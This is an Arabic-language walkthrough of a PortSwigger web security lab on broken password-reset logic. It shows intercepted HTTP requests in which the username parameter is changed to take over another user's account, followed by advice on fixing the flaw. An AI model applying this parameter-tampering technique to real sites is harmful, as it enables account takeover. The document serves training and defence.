# [Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)

## **`الهدف`**
القيام بإعادة ضبط كلمة مرور `reset password` حساب `carlos` والدخول إلي حسابه.
## **`خطوات الحل`**
نقوم بالضغط على زر `Forget password` ونقوم بكتابة الـ `email` الموجود في اللاب، ونتوجه للـ `email` ونضعط على رابط إعادة ضبط كلمة المرور، ونقوم بكتابة كلمة المرور الجديدة وتأكيدها، ونقوم باعتراض هذا الـ `request`
```http
POST /forgot-password?temp-forgot-password-token=xy047ba59arbjfindtycfgvnyq2ftwql HTTP/2
Host: 0a4700e104e9e74f82230bb3007300f1.web-security-academy.net
Cookie: session=Hy4YRkRW46Eej4EASJQ9t45p2dbLEjUZ

temp-forgot-password-token=xy047ba59arbjfindtycfgvnyq2ftwql&username=wiener&new-password-1=123&new-password-2=123
```

ونقوم بتغيير الـ `username` إلى `carlos`
```http
POST /forgot-password?temp-forgot-password-token=xy047ba59arbjfindtycfgvnyq2ftwql HTTP/2
Host: 0a4700e104e9e74f82230bb3007300f1.web-security-academy.net
Cookie: session=Hy4YRkRW46Eej4EASJQ9t45p2dbLEjUZ

temp-forgot-password-token=xy047ba59arbjfindtycfgvnyq2ftwql&username=carlos&new-password-1=123&new-password-2=123
```

وبعد ذلك نقوم بتسجيل الدخول لحساب `carlos` بالباسورد الذي اخترناه لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب عدم الثقة في مُدخلات المُستخدم، وعدم الاعتماد نهائيًا على مُعامل اسم المُستخدم في الـ `request` الخاص بإعادة ضبط كلمة المرور بل يجب الاعتماد على الـ `temp-forgot-password-token` 

يجب أن يتم ربط المستخدم به بشكل صارم في الواجهة الخلفية `back-end` ، 

وبجب توليد الـ `token` باستخدام دالة عشوائية آمنة تشفيرياً لمنع أى عمليات توقع أو تخمين من المُهاجم، كما أنه يجب أن يكون صالح لإستخدام مرة واحدة فقط ويتم حرقه بعد ذلك مباشرًة.

ويجب أن يكون الـ `token` له مدة صلاحية قصيرة `10-15` دقيقة ويتم حرقه بعدها حتى لو لم يتم استخدامه.

ويُفضل عندما يضغط المُستخدم على رابط إعادة ضبط كلمة المرور في حسابه أن يقوم السيرفر باستخراج الـ `token` من الـ `URL` وتضمينه داخل الـ `Form` كـ `hidden input` مثلًا، وعندما يكتب المُستخدم كلمة المرور الجديدة ويضعط حفظ يتم إرساله عبر الـ `POST Body` وليس بداخل الـ `URL`  لأن الـ `URLs` يتم تسجيلها في ملفات الـ `Logs` الخاصة بالسيرفر والـ `Proxy`، وهذا قد يؤدي لتسريب الـ `token` إذا لم يكن السيرفر مؤمن جيدًا، أو إذا كان المُستخدم يستعمل نوعًا من الـ `Proxy` أو الـ `VPN.`

ويجب إزالة مُعامل الـ `username` كليًا من الـ `request` لتفادي حدوث أى أخطاء مستقبلية من المبرمجين في الاعتماد عليه.
